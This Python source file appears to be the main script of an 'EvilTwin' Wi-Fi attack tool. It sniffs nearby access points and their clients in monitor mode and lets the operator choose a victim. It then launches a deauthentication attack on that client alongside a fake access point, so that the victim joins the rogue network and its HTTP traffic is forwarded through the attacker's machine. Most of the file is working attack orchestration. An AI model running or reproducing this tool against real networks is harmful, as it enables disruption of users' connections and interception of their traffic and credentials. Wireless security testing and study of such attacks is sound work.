import os
from netifaces import interfaces
from scapy.all import Dot11, Dot11Beacon, Dot11Deauth, RadioTap, sendp, packet
import signal
from time import sleep
import sys
import conf
import sniffer
import settings
from mode_switcher import mode_switcher
import subprocess   # For running 'channel_hopper.py' in background - sniffing all channels
from os import waitpid


def terminate():
    """
    Safe termination - changing inteface's mode back to managed.
    """
    conf.cleanup()
    # read 'mode_switcher.py' documentation for more information
    mode_switcher('managed')
    settings.system_operation('killall hostapd dnsmasq')
    print('Terminating Program...')
    settings.system_operation('killall python3')
    exit(0)


def signal_handler(sig_num=None, frame=None):
    """
    Signal handler for CTRL+C
    """

    # for multiple CTRL+C pressing
    signal.signal(signal.SIGINT, signal.SIG_IGN)
    print('\nCTRL+C Caught, do you want to exit the program? [Y/N]')
    ans = input()
    print("")

    # if user enters y/yes - terminate program
    if ans.lower() == 'y' or ans.lower() == 'yes':
        terminate()


def packet_handler(packet: packet):
    """
    MAC Header:
    [ Frame Control  |  Duration  |  Destination Address (addr1)  |  Source Address (addr2)  |  BSSID  |  Sequnece Control  |  Body  |  FCS ]

    This Function gets a packet and handles it.
    If the given packet is a Beacon and the sender (AP) is not yet listed - listing it and adding it's MAC and Channel to the dictionary as a tuple,
    and printing it's name, MAC and Channel to console.
    As this function runs with a channel hopper in background, it scans all channels for packets.

    :param scapy.packet packet: The examined packet got from sniff callback
    """

    # if packet is 802.11 packet
    if packet.haslayer(Dot11):

        # a Beacon packet
        if packet.haslayer(Dot11Beacon):

            # decoding AP's name to normal string
            beacon_name = packet.info.decode("utf-8")

            # if name is already listed - continue
            if beacon_name and beacon_name not in settings.ap_list.keys():

                # beacon's source address = AP's address, channel of signal.
                beacon_addr = packet.addr2.upper()
                beacon_channel = packet.channel

                # tuple AP's address and channel to it's name key.
                settings.ap_list[beacon_name] = (beacon_addr, beacon_channel)

                # smooth printing with alignment to the right
                print('{}{}\t\t{}\t\t{:<10}'.format(f'{len(settings.ap_list) - 1}: ',
                      f'MAC: {beacon_addr}', f'Channel: {beacon_channel}', f'SSID: {beacon_name}'))

        # else, 802.11 packet but not a beacon - check if has Frame Control information
        elif packet.FCfield:

            # DS - From DS / To DS - logical and
            DS = packet.FCfield & 0x3

            # To DS - first bit, From DS - second bit
            to_DS = DS & 0x1 != 0
            from_DS = DS & 0x2 != 0

            # To DS and not From DS - a packet from AP to Client
            if to_DS and not from_DS:

                # checking if client's mac already listed - if not adding it to the relevant AP's client list
                if packet.addr2.upper() not in settings.client_list.setdefault(packet.addr1.upper(), []):
                    settings.client_list[packet.addr1.upper()].append(
                        packet.addr2.upper())


def main():
    """
    Main function for attack
    """
    print('\n------------- EvilTwin Attack -------------\n')
    # asssigning signal handler
    signal.signal(signal.SIGINT, signal_handler)
    settings.init()

    # print available wlan interfaces by using netifaces.intefaces() which returns a list of available wireless intefaces
    print('Availible Interfaces:')
    for i, j in enumerate(interfaces()):
        print(f'{i}: {j}')

    # assigning Interface's name
    monitor_input = input(
        f"\nChoose an interface to sniff: ").strip()
    while (not monitor_input.isnumeric()) and settings.monitor not in interfaces():
        print("Not a valid index! see listed interfaces' indexing")
        monitor_input = input(
            f"\nChoose an interface to sniff: ").strip()

    settings.monitor = interfaces()[int(monitor_input)]

    # assigning Interface's name
    internet_input = input(
        f"\nChoose an interface to forward http requests through: ").strip()
    while (not internet_input.isnumeric()) and settings.internet not in interfaces():
        print("Not a valid index! see listed interfaces' indexing")
        internet_input = input(
            f"\nChoose an interface to forward http requests through: ").strip()

    settings.internet = interfaces()[int(internet_input)]


    to = input('OPTIONAL: Timeout for sniffing ( default is 60s ): ').strip()
    if to.isnumeric():
        # assigning time-out for sniffing interface if given - 60 seconds defaultwaaaaaa211111
        settings.time_out = int(to)

    # switching interface's mode to monitor
    mode_switcher('monitor')

    # some basic UX communication
    print(f'\nSniffing traffic on {settings.monitor}...\n')
    print('*****************************************************************')
    print('*                                                               *')
    print('*\tTo stop program from running press CTRL+C at any time!\t*')
    print('*                                                               *')
    print('*****************************************************************')

    # The next line opens a new process as a sub-proccess with a different session - for asynchronic run
    hopper_id = subprocess.Popen(
        [sys.executable, 'channel_hopper.py', settings.monitor, str(settings.time_out)], start_new_session=True).pid

    # read 'sniff.py' documentation for more information
    sniffer.run()

    # stop channel hopping, not neccessary any more
    settings.system_operation(f'sudo kill -9 {hopper_id}')

    # selecting Access Point to attack
    flag = False
    while not flag:
        settings.ap_name = input(
            "Please name one of the Access Points above to scan it's clients: ").strip()

        if settings.ap_name not in settings.ap_list:
            print(
                f"\n!!! {settings.ap_name} is not listed. Please provide a listed name of the above !!!\n")

        else:
            ap_mac = settings.ap_list[settings.ap_name][0]
            settings.system_operation(
                f'sudo iwconfig {settings.monitor} channel {settings.ap_list[settings.ap_name][1]}')
            flag = True

    # printing Access Point's clients
    try:
        1 / len(settings.client_list[ap_mac])
        print(f"\n{settings.ap_name}'s connected clients are: ")
        for i, v in enumerate(settings.client_list[ap_mac]):
            print(f'{i}:\t{v}')
        print('')
    except:
        print(f'\n{settings.ap_name} has no connected clients!\n')
        flag = False

    # selecting a client to attack
    while flag:

        target = input("Choose a client to attack (by it's index): ").strip()
        if target.isnumeric():
            target_num = int(target)
            if target_num >= 0 and target_num < len(settings.client_list[ap_mac]):
                target_mac = settings.client_list[ap_mac][target_num]
                flag = False
                # deautenticate_client(ap_mac, target_mac)
                
            else:
                print(f'\n{target_num} is not a valid index. Try again\n')
        else:
            print(f"\n'{target}' is not a valid input. Try again\n")
    conf.configurate()
    conf.fake_ap_configuration()
    deauth_id = subprocess.Popen(
                    [sys.executable, 'deauth_attack.py', settings.monitor, ap_mac, target_mac], start_new_session=True).pid
    fake_ap_id = subprocess.Popen(
                    [sys.executable, 'fake_ap.py', settings.hosting], start_new_session=True).pid
    waitpid(fake_ap_id, 0)

    waitpid(deauth_id, 0)
    # safe termination

    terminate()


if __name__ == "__main__":
    main()
